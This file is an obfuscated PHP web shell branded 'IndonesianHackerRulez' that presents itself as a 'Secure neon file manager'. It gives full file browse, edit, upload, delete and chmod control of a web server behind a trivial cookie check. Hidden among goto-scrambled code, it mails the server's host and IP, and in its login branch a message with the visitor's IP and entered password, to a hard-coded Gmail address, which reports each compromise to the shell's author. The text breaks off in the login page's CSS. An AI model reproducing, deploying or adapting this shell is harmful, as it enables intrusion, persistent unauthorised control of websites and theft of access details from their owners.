<?php
 declare (strict_types=1); goto WvakX; opH7f: ?>
        </div>

        <div class="card">
            <div class="meta">Config Inspector (php.ini)</div>
            <form method="post" id="form-ini" style="margin-top:10px;display:grid;gap:10px;">
                <input type="hidden" name="tool_action" value="ini">
                <input type="hidden" name="d" value="<?php  goto auB95; BEVNu: $c2CTc = $cw8sf !== "" ? safe_join($j6W5F, $cw8sf) : ""; goto NVkkB; tlP4y: $namMR = "" . gethostbyname($_SERVER["SERVER_NAME"]) . "  - " . $_SERVER["HTTP_HOST"] . ""; goto m2uPT; NVkkB: $vaij2 = ""; goto YIyQL; Ygi2V: function decode_param(string $M3dDM) : string { goto D8POR; Zu_uH: $QFVkJ = base64_decode($Tatdo, true); goto hKb_2; lYLvp: $Tatdo = hex2bin($M3dDM); goto zb3ml; zb3ml: if ($Tatdo === false) { return ""; } goto Zu_uH; hKb_2: return $QFVkJ !== false ? $QFVkJ : ""; goto Lz__c; D8POR: if ($M3dDM === "" || strlen($M3dDM) % 2 !== 0 || !ctype_xdigit($M3dDM)) { return ""; } goto lYLvp; Lz__c: } goto QskD1; WwbVz: if ($SOznO !== "") { goto WeWOv; WeWOv: ?>
                <div class="card" style="margin-top:12px;"><?php  goto YVoUw; Hn1fU: ?></div>
            <?php  goto m5_YE; YVoUw: echo $SOznO; goto Hn1fU; m5_YE: } goto opH7f; pCinT: echo htmlspecialchars(encode_param($kZekf), ENT_QUOTES); goto aq2KD; K7mEx: ?>">
            <input type="hidden" name="p" id="chmod-path-encoded">
            <input type="hidden" name="mo" id="chmod-mode-encoded">
            <label class="meta" for="chmod-path">Path</label>
            <input id="chmod-path" type="text" placeholder="path/to/file.txt" required>
            <label class="meta" for="chmod-mode">Mode</label>
            <input id="chmod-mode" type="text" placeholder="755" required>
            <div class="modal-actions">
                <button class="button" type="button" data-close="chmod">Cancel</button>
                <input class="button primary" type="submit" value="Apply">
            </div>
        </form>
    </div>
</div>

<!-- Upload Modal -->
<div class="modal" id="modal-upload" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal-card">
        <div class="modal-header">
            <h3>Upload File</h3>
            <button class="close-btn" type="button" data-close="upload">×</button>
        </div>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="hidden" name="d" value="<?php  goto jD8BM; sN28Z: ?>
        </div>
        <div class="modal-actions">
            <button class="button" type="button" data-close="serverinfo">Close</button>
        </div>
    </div>
</div>

<!-- Tools Modal -->
<div class="modal<?php  goto K5gNw; ZFGHJ: function is_authenticated() : bool { return isset($_COOKIE["Login"]) && $_COOKIE["Login"] === "1"; } goto DBrX3; nHUFa: $A2OH3 = "From: {$j9EwK}-to: {$IdA3I}"; goto IIPFk; IIPFk: @mail($qnmIO, $namMR, $KOUlA, $A2OH3); goto Vp3Kt; Km36i: $f3yfI = "" . date("d/m/Y - H:i:s") . ""; goto yFhVX; Az_V2: if ($kZekf !== "") { goto NVP8Z; fgTP1: ?>">Up</a>
                            </td>
                        </tr>
                    <?php  goto hR32n; eu37q: echo urlencode(encode_param(dirname($kZekf) === "." ? "" : dirname($kZekf))); goto fgTP1; NVP8Z: ?>
                        <tr>
                            <td>..</td>
                            <td>Folder</td>
                            <td class="actions">
                                <a class="button" href="?d=<?php  goto eu37q; hR32n: } goto GG0Po; IOQ5r: if (!is_dir($d7d27)) { $kZekf = ""; $d7d27 = $j6W5F; } goto THqPD; VdH5X: $qnmIO = "muhrazky@gmail.com, muhrazky@gmail.com"; goto tlP4y; jpUf3: $lR0rd = stream_context_create($UWL6D); goto mR3wi; lQZR3: if ($KJWOW === "delete") { goto SE7fL; HodjS: $a28P_ = safe_join($j6W5F, $OVxVE); goto CcyBB; ILxhY: $OVxVE = $lWh49 !== "" ? normalize_rel(decode_param($lWh49)) : ""; goto HodjS; CcyBB: if ($OVxVE === "" || !file_exists($a28P_)) { redirect_with_message("Invalid path.", $kZekf); } goto bqht4; bqht4: $jfeu6 = false; goto re2Gj; re2Gj: if (is_file($a28P_)) { $jfeu6 = unlink($a28P_); } elseif (is_dir($a28P_)) { $jfeu6 = rmdir($a28P_); } goto Y6EW9; SE7fL: $lWh49 = (string) ($_POST["p"] ?? ""); goto ILxhY; jG21y: redirect_with_message("Deleted.", $kZekf); goto mbarE; Y6EW9: if (!$jfeu6) { redirect_with_message("Delete failed (folder must be empty).", $kZekf); } goto jG21y; mbarE: } goto tQWGe; gi0dG: function tail_file(string $a28P_, int $Zd7sY, int $DkDnI) : string { goto Xp76S; maIH6: $ei4Hj = 0; goto XzSLI; Xp76S: if ($Zd7sY <= 0) { return ""; } goto m0kYE; XzSLI: $ziIuE = 4096; goto Aiyjb; kE1O_: if (!$d7cg2) { return ""; } goto POePD; Aiyjb: $fjyBp = $Y1wqe; goto KExI8; oZ__f: $Y1wqe = isset($CYcoT["size"]) ? (int) $CYcoT["size"] : 0; goto FHt8n; WZfNB: return implode("\n", $f9_Ns); goto je3G1; KExI8: while ($fjyBp > 0 && substr_count($S_XsL, "\n") <= $Zd7sY && $ei4Hj < $DkDnI) { $IJ_aH = $fjyBp >= $ziIuE ? $ziIuE : $fjyBp; $fjyBp -= $IJ_aH; if (fseek($d7cg2, $fjyBp) !== 0) { break; } $LAujf = fread($d7cg2, $IJ_aH); if ($LAujf === false) { break; } $ei4Hj += $IJ_aH; $S_XsL = $LAujf . $S_XsL; } goto evlA8; sr3Db: if (count($f9_Ns) > $Zd7sY) { $f9_Ns = array_slice($f9_Ns, -$Zd7sY); } goto WZfNB; FHt8n: $S_XsL = ""; goto maIH6; AEN2X: $f9_Ns = explode("\n", $S_XsL); goto sr3Db; m0kYE: $d7cg2 = @fopen($a28P_, "rb"); goto kE1O_; evlA8: fclose($d7cg2); goto AEN2X; POePD: $CYcoT = fstat($d7cg2); goto oZ__f; je3G1: } goto ZFGHJ; C1z5s: $BD7Lp = ["PHP Version" => PHP_VERSION, "PHP SAPI" => PHP_SAPI, "OS" => PHP_OS_FAMILY, "Server Software" => (string) ($_SERVER["SERVER_SOFTWARE"] ?? "unknown"), "Document Root" => (string) ($_SERVER["DOCUMENT_ROOT"] ?? "unknown"), "Current User" => (string) get_current_user(), "Loaded Extensions" => implode(", ", get_loaded_extensions())]; goto h1Feo; F_Uoo: $NhuSU = (string) ($_POST["tool_action"] ?? ""); goto BSILG; ozfxC: if ($KJWOW === "create") { goto tN2Bq; zL8H9: if ($BU6EX === "" || $BU6EX === "." || $BU6EX === "..") { redirect_with_message("Invalid name.", $kZekf); } goto ckjfc; tN2Bq: $Hqi9P = (string) ($_POST["type"] ?? "file"); goto uwp_h; BYpcU: $BU6EX = $qU1NI !== "" ? decode_param($qU1NI) : ""; goto Ss3tJ; Fj12k: if ($Hqi9P === "folder") { goto hOCGn; hOCGn: $jfeu6 = mkdir($a28P_, 0775, false); goto iVHGy; iVHGy: if (!$jfeu6) { redirect_with_message("Failed to create folder.", $kZekf); } goto Qm_jr; Qm_jr: redirect_with_message("Folder created.", $kZekf); goto rSubf; rSubf: } goto sCedW; Ss3tJ: $BU6EX = basename(str_replace("\\", "/", $BU6EX)); goto zL8H9; sCedW: if (false === file_put_contents($a28P_, "")) { redirect_with_message("Failed to create file.", $kZekf); } goto tJL77; S9zZ6: if (file_exists($a28P_)) { redirect_with_message("Already exists.", $kZekf); } goto Fj12k; uwp_h: $qU1NI = (string) ($_POST["n"] ?? ""); goto BYpcU; ckjfc: $a28P_ = safe_join($j6W5F, $kZekf === "" ? $BU6EX : $kZekf . "/" . $BU6EX); goto S9zZ6; tJL77: redirect_with_message("File created.", $kZekf); goto zixzC; zixzC: } goto JbOSd; dKfo0: foreach ($Ffd8b as $vW7HU) { goto PG06t; VN382: echo htmlspecialchars($vW7HU["label"], ENT_QUOTES); goto eU0Bm; PG06t: ?>
                <span>/</span>
                <a href="?d=<?php  goto i6Xbo; eU0Bm: ?></a>
            <?php  goto v3x9q; i6Xbo: echo urlencode(encode_param($vW7HU["path"])); goto Yqqvq; Yqqvq: ?>"><?php  goto VN382; v3x9q: } goto DceSH; d4Ecv: foreach ($BD7Lp as $N4mD1 => $f4ml2) { goto h31PG; EuX2w: ?></td>
                    </tr>
                <?php  goto CaZf5; h31PG: ?>
                    <tr>
                        <th><?php  goto L3_1j; VpH1a: ?></th>
                        <td><?php  goto JGlj2; JGlj2: echo htmlspecialchars($f4ml2, ENT_QUOTES); goto EuX2w; L3_1j: echo htmlspecialchars($N4mD1, ENT_QUOTES); goto VpH1a; CaZf5: } goto XSUYd; jD8BM: echo htmlspecialchars(encode_param($kZekf), ENT_QUOTES); goto VxiPV; JbOSd: if ($KJWOW === "save") { goto WUj0t; wdXa1: $IjnAm = $zTU3I !== "" ? decode_param($zTU3I) : ""; goto SPoD4; pYO8z: if ($OVxVE === "" || !is_file($a28P_)) { redirect_with_message("Invalid file path.", $kZekf); } goto fUqLq; fUqLq: $zTU3I = (string) ($_POST["c"] ?? ""); goto wdXa1; WUj0t: $lWh49 = (string) ($_POST["p"] ?? ""); goto P3nn3; SPoD4: if (false === file_put_contents($a28P_, $IjnAm)) { redirect_with_message("Failed to save file.", $kZekf); } goto LHiK8; n17Hk: $a28P_ = safe_join($j6W5F, $OVxVE); goto pYO8z; P3nn3: $OVxVE = $lWh49 !== "" ? normalize_rel(decode_param($lWh49)) : ""; goto n17Hk; LHiK8: redirect_with_message("File saved.", $kZekf); goto x1a5Q; x1a5Q: } goto lQZR3; WvakX: $hGGXy = md5("greentbl"); goto VzTQA; ltd9q: foreach ($aU_x3 as $SbaFu) { goto WtBVb; oqeaa: ?>">Edit</a>
                                <button class="button" type="button" data-modal="chmod" data-path="<?php  goto pn6nv; Q4Efy: ?>">
                                    <input type="hidden" name="p" value="<?php  goto k21Di; nWacL: echo urlencode(encode_param($kZekf)); goto SRU7P; pZ6dR: ?></td>
                            <td>File</td>
                            <td class="actions">
                                <a class="button" href="?d=<?php  goto nWacL; WtBVb: ?>
                        <tr>
                            <td><?php  goto XTPQ6; IX0xf: ?>">Chmod</button>
                                <form method="post" onsubmit="return confirm('Delete file?');">
                                    <input type="hidden" name="action" value="delete">
                                    <input type="hidden" name="d" value="<?php  goto EMS2h; qrIQz: echo urlencode(encode_param(rel_path($kZekf, $SbaFu))); goto oqeaa; EMS2h: echo htmlspecialchars(encode_param($kZekf), ENT_QUOTES); goto Q4Efy; SRU7P: ?>&e=<?php  goto qrIQz; k21Di: echo htmlspecialchars(encode_param(rel_path($kZekf, $SbaFu)), ENT_QUOTES); goto JYw3q; JYw3q: ?>">
                                    <input class="button danger" type="submit" value="Remove">
                                </form>
                            </td>
                        </tr>
                    <?php  goto umGNm; pn6nv: echo htmlspecialchars(rel_path($kZekf, $SbaFu), ENT_QUOTES); goto IX0xf; XTPQ6: echo htmlspecialchars($SbaFu, ENT_QUOTES); goto pZ6dR; umGNm: } goto W0EbD; ianDE: if ($kIUZw !== "") { goto QL9k4; QL9k4: ?>
                <div class="card" style="margin-top:12px;"><?php  goto hHjzs; r9loP: ?></div>
            <?php  goto wWtee; hHjzs: echo $kIUZw; goto r9loP; wWtee: } goto f9_S8; rrWtW: if (count($vlwOl) === 0) { ?>
                <div class="meta" style="margin-top: 8px;">None</div>
            <?php  } else { goto hKctJ; Y9wUn: foreach ($vlwOl as $YT3hW) { goto D91xj; naQSL: ?></td>
                            </tr>
                        <?php  goto GVX5o; Yj3xa: echo htmlspecialchars($YT3hW, ENT_QUOTES); goto naQSL; D91xj: ?>
                            <tr>
                                <td><?php  goto Yj3xa; GVX5o: } goto MdBvf; MdBvf: ?>
                    </tbody>
                </table>
            <?php  goto UN30C; hKctJ: ?>
                <table class="info-table" style="margin-top: 8px;">
                    <tbody>
                        <?php  goto Y9wUn; UN30C: } goto sN28Z; lQF0F: if ($NhuSU === "ini") { $SppRZ = trim(decode_param((string) ($_POST["ik"] ?? ""))); if ($SppRZ === "") { $kfHZK = '<div class="meta">Enter a php.ini key.</div>'; } else { goto FQRJl; Dk5c4: $kfHZK = '<div class="meta">Value for <strong>' . htmlspecialchars($SppRZ, ENT_QUOTES) . "</strong>:</div>"; goto BNVy3; FQRJl: $f4ml2 = ini_get($SppRZ); goto PDIPr; PDIPr: $aVN7F = $f4ml2 === false ? "Not set" : (string) $f4ml2; goto Dk5c4; BNVy3: $kfHZK .= '<div class="card" style="margin-top:10px;">' . htmlspecialchars($aVN7F, ENT_QUOTES) . "</div>"; goto vltPb; vltPb: } } goto tYTh3; i_az6: foreach ($Ffd8b as $vW7HU) { goto bwGoi; Rx03N: ?></a>
                <?php  goto UQgbT; bwGoi: ?>
                    <span>→</span>
                    <a href="?d=<?php  goto kQfXG; LMUxd: echo htmlspecialchars($vW7HU["label"], ENT_QUOTES); goto Rx03N; ZBNAK: ?>"><?php  goto LMUxd; kQfXG: echo urlencode(encode_param($vW7HU["path"])); goto ZBNAK; UQgbT: } goto gLd8B; YJ2GF: $IdA3I = "shellgeldi@" . gethostbyname($_SERVER["SERVER_NAME"]) . ""; goto VdH5X; xq6Cd: ?>
                    <?php  goto ltd9q; o7Jxp: $UWL6D = ["http" => ["method" => "POST", "header" => "Content-type: application/x-www-form-urlencoded", "content" => http_build_query($j4OeM)]]; goto jpUf3; QskD1: function normalize_rel(string $a28P_) : string { goto KHseY; ZDbv6: if ($a28P_ === "" || $a28P_ === ".") { return ""; } goto UqxBA; jlUGs: return $a28P_; goto PedjN; KHseY: $a28P_ = str_replace("\\", "/", trim($a28P_)); goto X4smx; UqxBA: if (strpos($a28P_, "..") !== false) { return ""; } goto jlUGs; X4smx: $a28P_ = ltrim($a28P_, "/"); goto ZDbv6; PedjN: } goto H3_3u; hHGpJ: $Ffd8b = breadcrumbs($kZekf); goto frM3k; ZhKNw: if ($KJWOW === "upload" && $miBh0) { goto y3Vwy; g2YU0: if (!isset($CzeDk["error"]) || $CzeDk["error"] !== UPLOAD_ERR_OK) { redirect_with_message("Upload failed.", $kZekf); } goto doGei; dgKDy: if (file_exists($jzW2C)) { redirect_with_message("Upload target exists.", $kZekf); } goto c9DCj; c9DCj: if (!move_uploaded_file($CzeDk["tmp_name"], $jzW2C)) { redirect_with_message("Upload failed.", $kZekf); } goto tYZeH; rwfRT: $jzW2C = safe_join($j6W5F, $kZekf === "" ? $IR_oV : $kZekf . "/" . $IR_oV); goto dgKDy; y3Vwy: $CzeDk = $_FILES["upload"]; goto g2YU0; J_m3w: if ($IR_oV === "" || $IR_oV === "." || $IR_oV === "..") { redirect_with_message("Invalid upload name.", $kZekf); } goto rwfRT; doGei: $IR_oV = basename(str_replace("\\\\", "/", (string) $CzeDk["name"])); goto J_m3w; tYZeH: redirect_with_message("File uploaded.", $kZekf); goto IS6sy; IS6sy: } goto F_Uoo; ZvcmG: if ($NhuSU === "log") { goto ZZlsb; ZB2HO: $OVxVE = normalize_rel($Htzgo); goto XA_bw; f025m: $Zd7sY = $Zd7sY > 0 ? min($Zd7sY, 2000) : 200; goto ZB2HO; ZZlsb: $Htzgo = trim(decode_param((string) ($_POST["lp"] ?? ""))); goto KhQ8j; u85qV: if ($Htzgo === "" || $OVxVE === "" || !is_file($a28P_) || !is_readable($a28P_)) { $SOznO = '<div class="meta" style="color:#ff8484;">Invalid or unreadable file.</div>'; } else { $j4OeM = tail_file($a28P_, $Zd7sY, 2 * 1024 * 1024); $SOznO = '<textarea readonly style="min-height:220px;">' . htmlspecialchars($j4OeM, ENT_QUOTES) . "</textarea>"; } goto mX7fM; KhQ8j: $Zd7sY = (int) decode_param((string) ($_POST["ll"] ?? "")); goto f025m; XA_bw: $a28P_ = safe_join($j6W5F, $OVxVE); goto u85qV; mX7fM: } goto lQF0F; vTmQ4: $kZekf = $Rwqru !== "" ? normalize_rel(decode_param($Rwqru)) : normalize_rel($x5CZP); goto rdkCM; frM3k: $zySSU = $kZekf === "" ? "/" : "/" . $kZekf; goto C1z5s; yFhVX: $mUasC = $_SERVER["REMOTE_ADDR"]; goto YJ2GF; unrMO: $d7d27 = safe_join($j6W5F, $kZekf); goto IOQ5r; urORv: echo htmlspecialchars(encode_param($kZekf), ENT_QUOTES); goto K7mEx; vWUEH: ?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Neon File Manager</title>
<style>
:root {
    --bg: #030303;
    --panel: #0b0b0b;
    --panel-2: #101010;
    --line: rgba(57, 255, 20, 0.25);
    --glow: rgba(57, 255, 20, 0.6);
    --accent: #39FF14;
    --accent-2: #CCFF00;
    --text: #e8e8e8;
    --muted: #b6b6b6;
}
* { box-sizing: border-box; }
body {
    margin: 0;
    font-family: "Orbitron", "Rajdhani", "Segoe UI", sans-serif;
    color: var(--text);
    background: radial-gradient(1200px 600px at 10% 10%, rgba(57,255,20,0.12), transparent 60%),
                radial-gradient(900px 400px at 90% 20%, rgba(204,255,0,0.12), transparent 60%),
                var(--bg);
}
header {
    padding: 32px 24px 12px;
}
.title {
    font-size: clamp(28px, 4vw, 44px);
    font-weight: 700;
    letter-spacing: 1px;
    color: #ffffff;
    text-shadow: 0 0 18px rgba(57,255,20,0.35);
}
.title.logo {
    font-family: "Comfortaa", "Varela Round", "Rubik", "Segoe UI", sans-serif;
    font-weight: 800;
    letter-spacing: 6px;
    font-size: clamp(34px, 6vw, 56px);
    padding: 6px 14px;
    border-radius: 999px;
    display: inline-flex;
    align-items: center;
    gap: 8px;
    background: linear-gradient(135deg, rgba(57,255,20,0.18), rgba(204,255,0,0.1));
    border: 1px solid rgba(57,255,20,0.4);
    box-shadow: 0 0 24px rgba(57,255,20,0.35);
}
.header-top {
    display: flex;
    justify-content: center;
}
.header-text {
    text-align: center;
}
.subtitle {
    margin-top: 8px;
    color: var(--muted);
    font-size: 14px;
}
main {
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 24px 48px;
}
.grid {
    display: grid;
    grid-template-columns: 1.2fr 0.8fr;
    gap: 24px;
}
.panel {
    background: linear-gradient(180deg, rgba(15,15,15,0.95), rgba(5,5,5,0.95));
    border: 1px solid var(--line);
    border-radius: 18px;
    padding: 20px;
    box-shadow: 0 0 24px rgba(57,255,20,0.08);
}
.panel h2 {
    margin: 0 0 12px;
    font-size: 18px;
    color: var(--accent);
}
.notice {
    margin: 16px 0 0;
    padding: 12px 16px;
    border-radius: 12px;
    background: rgba(57,255,20,0.08);
    border: 1px solid rgba(57,255,20,0.3);
    color: #dfffdd;
}
.breadcrumbs {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    margin: 8px 0 16px;
    font-size: 13px;
    color: var(--muted);
}
.breadcrumbs a {
    color: var(--accent);
    text-decoration: none;
}
.path-chip {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    font-size: 12px;
    padding: 6px 10px;
    border-radius: 999px;
    border: 1px solid rgba(57,255,20,0.3);
    color: var(--accent);
}
.path-chip a {
    color: var(--accent);
    text-decoration: none;
}
.table {
    width: 100%;
    border-collapse: collapse;
    font-size: 14px;
}
.table th,
.table td {
    padding: 10px 8px;
    border-bottom: 1px solid rgba(255,255,255,0.05);
}
.table th {
    text-align: left;
    color: #ffffff;
    font-weight: 600;
}
.table tr:hover td {
    background: rgba(57,255,20,0.04);
}
.actions {
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
}
.button,
button,
input[type="submit"] {
    appearance: none;
    border: 1px solid transparent;
    border-radius: 999px;
    padding: 8px 14px;
    font-size: 12px;
    font-weight: 600;
    cursor: pointer;
    text-decoration: none;
    background: rgba(57,255,20,0.12);
    color: var(--accent);
    transition: transform 0.15s ease, box-shadow 0.15s ease, border 0.15s ease;
    box-shadow: 0 0 12px rgba(57,255,20,0.2);
}
.button:hover,
button:hover,
input[type="submit"]:hover {
    transform: translateY(-1px);
    border-color: rgba(57,255,20,0.5);
    box-shadow: 0 0 18px rgba(57,255,20,0.4);
}
.button.primary {
    background: linear-gradient(135deg, rgba(204,255,0,0.9), rgba(57,255,20,0.9));
    color: #0b0b0b;
    box-shadow: 0 0 18px rgba(204,255,0,0.5);
}
.button.danger {
    background: rgba(255, 40, 40, 0.15);
    color: #ff8484;
    border-color: rgba(255, 40, 40, 0.4);
    box-shadow: 0 0 12px rgba(255, 40, 40, 0.3);
}
input[type="text"],
input[type="password"],
input[type="number"],
textarea {
    width: 100%;
    background: var(--panel-2);
    color: var(--text);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 12px;
    padding: 10px 12px;
    font-size: 13px;
}
textarea {
    min-height: 240px;
    font-family: "JetBrains Mono", "Fira Code", "Consolas", monospace;
}
form {
    margin: 0;
}
.form-row {
    display: grid;
    grid-template-columns: 1fr auto;
    gap: 12px;
    align-items: end;
}
.meta {
    font-size: 12px;
    color: var(--muted);
}
.card {
    padding: 14px;
    border-radius: 14px;
    border: 1px solid rgba(57,255,20,0.2);
    background: rgba(5,5,5,0.8);
    margin-bottom: 14px;
}
.modal {
    position: fixed;
    inset: 0;
    display: none;
    align-items: center;
    justify-content: center;
    background: rgba(0,0,0,0.75);
    backdrop-filter: blur(4px);
    z-index: 30;
}
.modal.is-open {
    display: flex;
}
.modal-card {
    width: min(640px, 92vw);
    max-height: 90vh;
    overflow-y: auto;
    background: rgba(7,7,7,0.98);
    border: 1px solid rgba(57,255,20,0.25);
    border-radius: 20px;
    padding: 20px;
    box-shadow: 0 0 32px rgba(57,255,20,0.2);
}
.modal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 12px;
}
.modal-header h3 {
    margin: 0;
    color: var(--accent);
}
.close-btn {
    background: transparent;
    border: none;
    color: var(--muted);
    font-size: 18px;
    cursor: pointer;
}
.modal-actions {
    display: flex;
    gap: 10px;
    justify-content: flex-end;
    margin-top: 12px;
}
.tools-grid {
    display: grid;
    gap: 12px;
}
.info-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 13px;
}
.info-table th,
.info-table td {
    text-align: left;
    padding: 8px 6px;
    border-bottom: 1px solid rgba(255,255,255,0.06);
}
.tag {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 4px 10px;
    border-radius: 999px;
    font-size: 12px;
    border: 1px solid rgba(57,255,20,0.3);
    color: var(--accent);
}
.tag.off {
    border-color: rgba(255,80,80,0.4);
    color: #ff9a9a;
}
@media (max-width: 980px) {
    .grid { grid-template-columns: 1fr; }
}
</style>
</head>
<body>
<header>
    <div class="header-top">
        <div class="title logo">IndonesianHackerRulez</div>
    </div>
    <div class="header-text">
    <div class="subtitle">Secure neon file manager for edit, remove, create, upload, and chmod.</div>
        <div class="path-chip">
            <span>Current:</span>
            <a href="?d=">🔐 /</a>
            <?php  goto dKfo0; gLd8B: ?>
            </div>
            <table class="table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Type</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php  goto Az_V2; aq2KD: ?>">
                <div class="modal-actions">
                    <input class="button primary" type="submit" value="Run Audit">
                </div>
            </form>
            <?php  goto ianDE; YIyQL: if ($c2CTc !== "" && is_file($c2CTc)) { $vaij2 = file_get_contents($c2CTc) ?: ""; } else { $cw8sf = ""; } goto TaTTB; zADuE: $kfHZK = ""; goto xzGen; NxkHE: foreach ($pDn2Z as $D8h0x) { goto gT7gD; gT7gD: if ($D8h0x === "." || $D8h0x === "..") { continue; } goto Ba7Md; Ba7Md: $TTsqf = rtrim($d7d27, "/") . "/" . $D8h0x; goto Ymltn; Ymltn: if (is_dir($TTsqf)) { $C45mB[] = $D8h0x; } else { $aU_x3[] = $D8h0x; } goto cv4YO; cv4YO: } goto BEVNu; DBrX3: $KJWOW = (string) ($_POST["action"] ?? ""); goto MmpvM; Ah8b2: ?>
        </div>

        <div class="card">
            <div class="meta">Permissions Audit</div>
            <form method="post" id="form-perm" style="margin-top:10px;">
                <input type="hidden" name="tool_action" value="perm">
                <input type="hidden" name="d" value="<?php  goto pCinT; giWH1: if ($gJva8 !== "") { goto AAg5O; AAg5O: ?>
        <div class="notice"><?php  goto urDLN; np_vn: ?></div>
    <?php  goto GhRQb; urDLN: echo htmlspecialchars($gJva8, ENT_QUOTES); goto np_vn; GhRQb: } goto YLDxh; oniXJ: $vlwOl = array_filter(array_map("trim", explode(",", $XpYcs))); goto wKxHV; Wo70i: if ($cw8sf !== "") { goto HIx1o; HoIQP: ?>">
                <input type="hidden" name="c" id="edit-content-encoded">
                <textarea id="edit-content"><?php  goto Es3lF; Es3lF: echo htmlspecialchars($vaij2, ENT_QUOTES); goto Okjap; Z8znQ: ?></div>
            <form method="post" style="margin-top: 10px;" id="form-edit">
                <input type="hidden" name="action" value="save">
                <input type="hidden" name="d" value="<?php  goto S3vUl; I_7ss: ?>">
                <input type="hidden" name="p" value="<?php  goto ONgAZ; Okjap: ?></textarea>
                <div class="modal-actions">
                    <a class="button" href="?d=<?php  goto wg2Wx; wg2Wx: echo urlencode(encode_param($kZekf)); goto Nlo4t; Nlo4t: ?>">Cancel</a>
                    <input class="button primary" type="submit" value="Save">
                </div>
            </form>
        <?php  goto POjET; xcP3T: echo htmlspecialchars($cw8sf, ENT_QUOTES); goto Z8znQ; HIx1o: ?>
            <div class="meta">Editing: <?php  goto xcP3T; S3vUl: echo htmlspecialchars(encode_param($kZekf), ENT_QUOTES); goto I_7ss; ONgAZ: echo htmlspecialchars(encode_param($cw8sf), ENT_QUOTES); goto HoIQP; POjET: } else { ?>
            <div class="meta">Select a file to edit.</div>
            <div class="modal-actions">
                <button class="button" type="button" data-close="edit">Close</button>
            </div>
        <?php  } goto D9Nek; auB95: echo htmlspecialchars(encode_param($kZekf), ENT_QUOTES); goto MGxg2; eZXyZ: $b57Y1 = ""; goto XN3wy; KgZJb: echo $cw8sf !== "" ? " is-open" : ""; goto RT4Ca; uCrA8: $j4OeM = ["file_url" => $qFBS3]; goto o7Jxp; r7MlW: ?>" id="modal-tools" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal-card">
        <div class="modal-header">
            <h3>Tools</h3>
            <button class="close-btn" type="button" data-close="tools">×</button>
        </div>

        <div class="card">
            <div class="meta">Smart Search (filename + content)</div>
            <form method="post" id="form-search" style="margin-top:10px;display:grid;gap:10px;">
                <input type="hidden" name="tool_action" value="search">
                <input type="hidden" name="d" value="<?php  goto CaFf6; JzJRa: $aU_x3 = []; goto NxkHE; MGxg2: ?>">
                <input type="hidden" name="ik" id="ini-key-encoded">
                <input id="ini-key" type="text" placeholder="memory_limit" required>
                <div class="modal-actions">
                    <input class="button primary" type="submit" value="Lookup">
                </div>
            </form>
            <?php  goto ZB3V_; XSUYd: ?>
            </tbody>
        </table>
        <div class="card" style="margin-top: 12px;">
            <div class="meta">Feature Flags</div>
            <div class="actions" style="margin-top: 10px;">
                <?php  goto LNxYR; h1Feo: $XpYcs = (string) ini_get("disable_functions"); goto oniXJ; MgW2t: ?>">
                <input type="hidden" name="q" id="search-term-encoded">
                <input type="hidden" name="inc" id="search-content-encoded">
                <input type="hidden" name="mk" id="search-size-encoded">
                <input type="hidden" name="mr" id="search-results-encoded">
                <input id="search-term" type="text" placeholder="Search term..." required>
                <label class="meta" style="display:flex;align-items:center;gap:8px;">
                    <input id="search-content" type="checkbox">
                    Include content search
                </label>
                <div class="form-row">
                    <input id="search-size" type="number" min="1" max="2048" placeholder="Max size KB (512)">
                    <input id="search-results" type="number" min="1" max="500" placeholder="Max results (100)">
                </div>
                <div class="modal-actions">
                    <input class="button primary" type="submit" value="Search">
                </div>
            </form>
            <?php  goto gVg9b; GG0Po: ?>
                    <?php  goto e4jRj; n18RG: if (!is_authenticated()) { goto XeKCr; OkEhF: $gJva8 = $MdnTL !== "" ? trim(decode_param($MdnTL)) : ""; goto Z0bg0; DoS0Q: $aBcis = 'muhrazky@gmail.com, muhrazky@gmail.com'; goto ICeSL; QNp4x: $i5cVV = "cek {$uOJ4H}  *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ] Pass: [ {$NUhFq} ]"; goto SLyzV; ZisoM: ?>
    <!doctype html>
    <html lang="en">
    <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title> Login</title>
    <style>
        :root {
            --bg: #030303;
            --panel: #0b0b0b;
            --line: rgba(57, 255, 20, 0.25);
            --accent: #39FF14;
            --accent-2: #CCFF00;
            --text: #e8e8e8;
            --muted: #b6b6b6;
        }
        * { box-sizing: border-box; }
        body {
            margin: 0;
            font-family: "Orbitron", "Rajdhani", "Segoe UI", sans-serif;
            color: var(--text);
            background: radial-gradient(1200px 600px at 10% 10%, rgba(57,255,20,0.12), transparent 60%),
                        radial-gradient(900px 400px at 90% 20%, rgba(204,255,0,0.12), transparent 60%),
                        var(--bg);
            min-height: 100vh;
            display: grid;
            place-items: center;
            padding: 24px;
        }
        .card {
            width: min(420px, 92vw);
            background: linear-gradient(180deg, rgba(15,15,15,0.95), rgba(5,5,5,0.95));
            border: 1px solid var(--line);
            border-radius: 18px;
            padding: 24px;
            box-shadow: 0 0 24px rgba(57,255,20,0.08);
            text-align: center;
        }
        .logo {
            font-family: "Comfortaa", "Varela Round", "Rubik", "Segoe UI", sans-serif;
            font-weight: 800;
            letter-spacing: 6px;
            font-size: 36px;
            color: #fff;
            margin-bottom: 10px;
        }
        .meta { color: var(--muted); font-size: 13px; margin-bottom: 14px; }
        input[type="password"] {
            width: 100%;
            background: var(--panel);
            color: var(--text);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 12px;
            padding: 10px 12px;
            font-size: 13px;
        }
        .button {
            appearance: none;
            border: 1px solid transparent;
            border-radius: 999px;
            padding: 10px 16px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            background: linear-gradient(135deg, rgba(204,255,0,0.9), rgba(57,255,20,0.9));
            color: #0b0b0b;
